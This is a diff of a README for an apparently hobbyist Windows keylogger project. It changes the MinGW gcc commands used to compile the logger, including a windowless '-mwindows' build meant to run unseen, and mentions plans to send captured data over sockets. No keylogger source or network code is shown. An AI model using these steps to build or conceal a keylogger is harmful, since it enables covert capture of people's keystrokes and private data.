@@ -33,12 +33,12 @@ all the information collected by this program is formatted in xml, to view a sam
     
    **with window, for now this is the only real option untill updates are compleated**   
    
-       c:\ ... \ MinGw\bin>gcc \ ... \ keylogger\keyloggersoftware\main.cpp -lstdc++ \ ... \ keylogger\keyloggersoftware\keylogger.exe
+       c:\ ... \ MinGw\bin>gcc \ ... \ keylogger\keyloggersoftware\main.cpp \ ... \ keylogger\keyloggersoftware\Sanitize_KeylogBuff.cpp -lstdc++  -o \ ... \ keylogger\keyloggersoftware\keylogger.exe
    
    **without window, once buffered io works with sockets Ill be wrighting a compiler script, but for now you can use**
-    
-        c:\ ... \ MinGw\bin>gcc \ ... \ keylogger\keyloggersoftware\main.cpp -lstdc++ -mwindows \ ... \ keylogger\keyloggersoftware\keyloggerNoWindow.exe
-   es, 
+       
+       c:\ ... \ MinGw\bin>gcc \ ... \ keylogger\keyloggersoftware\main.cpp \ ... \ keylogger\keyloggersoftware\Sanitize_KeylogBuff.cpp -lstdc++  -mwindows -o \ ... \ keylogger\keyloggersoftware\keylogger.exe
+   
    
    
    **congradulations**, you can now run this exe and see what it can realy do,
